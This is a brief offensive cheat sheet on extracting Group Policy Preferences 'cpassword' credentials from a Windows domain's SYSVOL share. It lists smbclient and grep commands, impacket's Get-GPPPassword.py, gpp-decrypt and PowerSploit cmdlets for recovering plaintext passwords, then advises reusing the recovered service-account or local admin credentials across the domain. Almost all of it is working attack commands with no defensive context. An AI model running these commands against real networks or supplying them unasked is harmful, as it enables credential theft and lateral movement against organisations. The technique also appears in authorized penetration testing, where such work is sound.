# GPP cPassword Decrypt

Group Policy Preferences store credentials in SYSVOL XML files encrypted with a static AES key that Microsoft published.  
Any domain user can read SYSVOL.

Find `cpassword` attributes:
```bash
# From Linux
smbclient -N //DC/SYSVOL
find . -name "*.xml" | xargs grep -l "cpassword"

# impacket
Get-GPPPassword.py <domain>/<user>:<pass>@<DC>
```

Decrypt:
```bash
gpp-decrypt '<cpassword_base64>'
```

PowerSploit on-target:
```powershell
Get-CachedGPPPassword
Get-GPPPassword
```

Credentials from GPP often belong to service accounts or local admin — reuse across the domain.
